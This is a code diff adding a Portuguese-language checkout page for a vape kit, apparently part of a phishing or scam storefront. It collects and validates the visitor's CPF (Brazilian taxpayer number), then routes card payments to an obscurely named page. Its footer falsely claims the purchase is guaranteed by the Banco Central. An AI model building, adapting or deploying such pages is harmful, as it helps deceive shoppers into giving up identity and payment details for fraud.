@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forma de Pagamento</title>
+    <link rel="icon" type="image/png" href="https://static.vecteezy.com/system/resources/previews/011/198/785/non_2x/3d-illustration-of-successful-payment-using-electronic-data-capture-machine-and-issue-proof-of-payment-free-png.png">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding-bottom: 60px; /* Espaço para o rodapé */
+        }
+        .header {
+            background-color: #000;
+            color: #fff;
+            width: 100%;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 20px;
+        }
+        .main-content {
+            flex: 1;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #000;
+            margin: 0;
+        }
+        .description {
+            font-size: 14px;
+            color: #333;
+            margin-top: 10px;
+        }
+        .highlight {
+            color: #d9534f;
+            font-weight: bold;
+        }
+        .delivery-box {
+            width: 100%;
+            background-color: #f8f8f8;
+            border: 1px solid #ddd;
+            padding: 10px;
+            box-sizing: border-box;
+            margin-top: 20px;
+            font-size: 16px;
+            text-align: left;
+            font-weight: bold;
+        }
+        .checkbox-container {
+            margin-top: 20px;
+        }
+        .checkbox-container label {
+            font-size: 16px;
+            color: #333;
+        }
+        .checkbox-container input {
+            margin-right: 10px;
+        }
+        .payment-options {
+            display: flex;
+            flex-direction: column;
+            margin-top: 20px;
+        }
+        .payment-options h3 {
+            margin: 0 0 10px;
+            font-size: 18px;
+            color: #000;
+        }
+        .payment-option {
+            display: flex;
+            align-items: center;
+            background-color: #f8f8f8;
+            border: 1px solid #ddd;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .payment-option img {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+        }
+        .payment-option.processing {
+            background-color: #e0e0e0;
+            cursor: not-allowed;
+        }
+        .security-info {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #333;
+        }
+        .footer {
+            background-color: #2c8d05;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            box-sizing: border-box;
+            left: 0;
+        }
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .footer img {
+            width: 100px;
+            height: auto;
+            margin: 0 10px;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+        .footer small {
+            display: block;
+            margin-top: 10px;
+        }
+        .modal, .cpf-modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.4);
+            padding-top: 60px;
+        }
+        .modal-content, .cpf-modal-content {
+            background-color: #fefefe;
+            margin: 5% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover, .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .cpf-modal-content input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .cpf-modal-content button {
+            margin-top: 10px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #28a745;
+            color: white;
+            cursor: pointer;
+        }
+        .cpf-modal-content button:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+
+<header>
+    <img src="b1.png" alt="Imagem do Cabeçalho" style="width: 100%; height: auto;">
+</header>
+
+<body>
+    <div class="main-content">
+        <h2 class="title">Detalhes sobre o Pagamento</h2>
+        <br>
+        <p class="description">Escolha a melhor forma de Pagamento que se adequada às suas necessidades no momento. Aceitamos <strong>Cartão de Crédito</strong> em até 12x sem juros ou pague via <strong>PIX</strong> automático.</p>
+        <div class="delivery-box">
+            ENTREGA NORMAL VIA SEDEX
+        </div>
+        <div class="checkbox-container">
+            <input type="checkbox" id="payment-info">
+            <label for="payment-info">Receba em até <strong>7 dias</strong> via Sedex com o <strong>Frete Grátis</strong></label>
+        </div>
+        <div class="payment-options">
+            <h3>Formas de Pagamentos Disponíveis</h3>
+            <div class="payment-option" id="pix-option">
+                <img src="pix.svg" alt="PIX"> Pague utilizando o PIX
+            </div>
+            <div class="payment-option" id="cc-option">
+                <img src="cc.svg" alt="Cartão de Crédito"> Pague com o Cartão de Crédito
+            </div>
+        </div>
+        <div class="security-info">
+            <p>Garantimos a segurança de suas transações com as melhores práticas de proteção de dados. Se optar pelo pagamento via PIX, o processo é rápido e seguro, com confirmação imediata. Para pagamentos com Cartão de Crédito, utilizamos criptografia para proteger suas informações. Em qualquer forma de pagamento, sua segurança é nossa prioridade.</p>
+        </div>
+    </div>
+    <!-- Modal -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close">×</span>
+            <p>Você receberá seu <strong>Kit 3 Elfbar TE 5K</strong> em até <strong>7 dias</strong>, não pagará nenhum valor além do valor do produto. O vale é somente para a primeira compra.</p>
+        </div>
+    </div>
+    <!-- CPF Modal -->
+    <div id="cpfModal" class="cpf-modal">
+        <div class="cpf-modal-content">
+            <span class="close">×</span>
+            <p>Por medidas de segurança, precisamos que preencha seu <strong>CPF</strong> para confirmarmos a forma de pagamento. Por favor, digite seu <strong>CPF</strong> abaixo:</p>
+            <input type="text" id="cpf-input" placeholder="Digite seu CPF">
+            <button id="submit-cpf">Enviar</button>
+        </div>
+    </div>
+    <footer class="footer">
+        <div class="footer-content">
+            <p>Sua compra <strong>100% segura</strong> com garantia do <strong>Banco Central</strong></p>
+        </div>
+    </footer>
+    <script>
+        // Exibe a mensagem flutuante ao marcar o checkbox
+        document.getElementById('payment-info').addEventListener('change', function() {
+            if (this.checked) {
+                document.getElementById('myModal').style.display = 'block';
+            }
+        });
+
+        // Exibe a modal para CPF e redireciona após validação
+        function showCpfModal(callback) {
+            document.getElementById('cpfModal').style.display = 'block';
+            document.getElementById('submit-cpf').onclick = function() {
+                const cpf = document.getElementById('cpf-input').value;
+                if (validateCPF(cpf)) {
+                    callback();
+                } else {
+                    alert('CPF inválido');
+                }
+            };
+        }
+
+        // Verifica se o CPF é válido
+        function validateCPF(cpf) {
+            cpf = cpf.replace(/[^\d]+/g, '');
+            if (cpf.length !== 11) return false;
+            let sum = 0;
+            let remainder;
+            for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+            remainder = (sum * 10) % 11;
+            if ((remainder === 10) || (remainder === 11)) remainder = 0;
+            if (remainder !== parseInt(cpf.substring(9, 10))) return false;
+            sum = 0;
+            for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+            remainder = (sum * 10) % 11;
+            if ((remainder === 10) || (remainder === 11)) remainder = 0;
+            if (remainder !== parseInt(cpf.substring(10, 11))) return false;
+            return true;
+        }
+
+        document.getElementById('pix-option').addEventListener('click', function() {
+            showCpfModal(function() {
+                window.location.href = 'pix.html';
+            });
+        });
+
+        document.getElementById('cc-option').addEventListener('click', function() {
+            showCpfModal(function() {
+                window.location.href = '74h4r8.html'; // Redireciona para o arquivo 74h4r8.html
+            });
+        });
+
+        // Fechar modais
+        document.querySelectorAll('.close').forEach(el => {
+            el.onclick = function() {
+                el.parentElement.parentElement.style.display = 'none';
+            };
+        });
+
+        window.onclick = function(event) {
+            if (event.target === document.getElementById('myModal') || event.target === document.getElementById('cpfModal')) {
+                event.target.style.display = 'none';
+            }
+        };
+    </script>
+        <footer>
+            <img src="p3.png" alt="Imagem do Rodapé" style="width: 100%; height: auto;">
+        </footer>
+</body>
+</html>
